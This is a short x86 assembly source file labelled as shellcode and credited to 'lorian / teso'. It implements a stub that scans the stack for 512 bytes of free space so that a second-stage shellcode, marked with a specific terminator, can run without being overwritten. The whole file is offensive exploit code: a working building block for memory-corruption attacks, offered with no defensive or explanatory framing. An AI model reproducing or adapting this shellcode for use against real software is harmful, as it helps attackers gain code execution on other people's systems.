/* x86 spset shellcode
 *
 * lorian / teso 
 */
	.globl	cbegin
	.globl  _cbegin
	.globl	cend
	.globl  _cend

/* searches for 512 bytes "free" space on stack without destroying it
 * like any kind of call would do...
 *
 * NOTE: your real shellcode must be terminated with 
 *       \x78\x56\x34\x12 for this code to work... 
 */

_cbegin:
cbegin:

	movl 	$0x12345678, %eax
a:
        cdq
	movb	$0x02, %dh
b:
	popl	%ebx
	pushl	%ebx
	incl	%esp
	decl	%edx
	jz	c
	cmpl	%eax, %ebx
	je	a
	jmp	b
c:

_cend:
cend:
